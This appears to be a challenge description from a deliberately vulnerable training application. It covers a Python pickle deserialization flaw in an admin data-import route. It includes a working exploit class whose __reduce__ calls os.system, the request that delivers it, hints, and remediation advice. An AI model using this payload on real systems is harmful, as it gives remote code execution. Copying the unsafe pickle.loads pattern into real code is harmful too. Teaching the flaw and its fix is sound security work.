# insecure_deserialization_admin_import

| Field | Value |
|---|---|
| OWASP | A08:2021 Software and Data Integrity Failures |
| CWE | CWE-502 |
| Difficulty | Advanced |
| Chains into | mass_assignment_role (reach admin) → this module → RCE |

## Vulnerable code
`modules/insecure_deserialization_admin_import/routes.py: import_data()`
calls `pickle.loads()` directly on base64-decoded client-supplied data.
Requiring an admin session narrows *who* can trigger it, but doesn't
prevent the deserialization vulnerability itself — pickle executes code
during deserialization via `__reduce__`, regardless of who's logged in.

## Player path
1. Get admin access (via `mass_assignment_role`, or by using the seeded
   `admin` account directly if testing this module in isolation).
2. Generate a payload (verified working during development):
   ```python
   import pickle, base64, os

   class Exploit:
       def __reduce__(self):
           return (os.system, ('id > /tmp/pwned.txt',))

   payload = base64.b64encode(pickle.dumps(Exploit())).decode()
   print(payload)
   ```
3. `POST /admin/import-data {"payload": "<paste output>"}`
4. Command executes server-side the moment `pickle.loads()` runs — this
   happens during **deserialization itself**, before your code ever
   inspects the resulting object.

## Hints
- Hint 1: "What format does this 'backup restore' feature actually expect? What does that format allow?"
- Hint 2: "Pickle isn't just a data format — deserializing untrusted pickle data is equivalent to running arbitrary code."

## Remediation
- Never use `pickle` (or `yaml.load` without `SafeLoader`, or PHP's `unserialize()`, etc.) on any data that could originate from a client, even an authenticated one.
- Use a data-only format (JSON) for any import/restore feature — it has no mechanism for arbitrary code execution during parsing.
- If binary object serialization is genuinely required, use a format with no executable behavior (e.g. Protocol Buffers) and validate the schema strictly before use.
